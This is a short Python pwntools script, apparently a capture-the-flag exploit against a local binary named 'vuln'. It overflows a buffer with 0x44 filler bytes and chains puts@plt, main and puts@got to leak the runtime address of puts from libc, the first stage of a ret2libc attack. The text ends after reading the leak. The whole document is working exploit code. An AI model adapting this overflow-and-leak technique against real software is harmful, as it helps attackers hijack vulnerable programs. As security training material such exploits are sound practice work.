#!/bin/python

from pwn import *

elf = context.binary = ELF('./vuln')
libc = elf.libc
p = process("./vuln")
p.recvline()
p.recvline()
p.recvline()
#p.recvuntil('message:\n')

payload = flat(
    'A' * 0x44,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)